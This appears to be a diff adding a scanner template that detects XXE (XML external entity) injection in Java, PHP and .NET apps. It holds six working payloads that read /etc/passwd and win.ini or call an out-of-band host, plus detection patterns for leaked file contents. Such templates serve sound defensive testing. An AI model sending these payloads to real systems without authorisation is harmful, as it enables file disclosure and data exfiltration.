@@ -1,0 +1,56 @@
+id: "xxe"
+issue_code: "xxe"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 90
+  - response_condition:
+      contains: "root:x:0:0:"
+      part: response_body
+      confidence: 90
+  - response_condition:
+      contains: "[boot loader]"
+      part: response_body
+      confidence: 90
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: dtd_name
+    value: "{{randomLowercaseString 4}}"
+  - name: entity_name
+    value: "{{randomLowercaseString 4}}"
+launch:
+  operator: or
+  conditions:
+    - type: parameter_value_data_type
+      value: xml
+    - type: insertion_point_name
+      parameter_names:
+        - xml
+        - data
+        - input
+        - payload
+        - document
+        - file
+    - type: scan_mode
+      value: fuzz
+    - type: response_condition
+      response_condition:
+        contains: "<?xml"
+        part: body
+templates:
+  - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY {{.entity_name}} SYSTEM "http://{{.oob_address}}/">]><data>&{{.entity_name}};</data>'
+  - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY {{.entity_name}} SYSTEM "file:///etc/passwd">]><data>&{{.entity_name}};</data>'
+  - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY {{.entity_name}} SYSTEM "file:///c:/windows/win.ini">]><data>&{{.entity_name}};</data>'
+  - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % {{.dtd_name}} SYSTEM "http://{{.oob_address}}/"> %{{.dtd_name}};]><data>xxe</data>'
+  - '<?xml version="1.0"?><!DOCTYPE {{.dtd_name}} [<!ENTITY % param1 "<!ENTITY &#x25; param2 SYSTEM ''http://{{.oob_address}}/''>"> %param1; %param2;]><{{.dtd_name}}>xxe</{{.dtd_name}}>'
+  - '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE data [<!ENTITY {{.entity_name}} SYSTEM "http://{{.oob_address}}/">]><data>&{{.entity_name}};</data>'
+categories:
+  - xxe
+  - oob
+  - injection
+platforms:
+  - java
+  - php
+  - dotnet
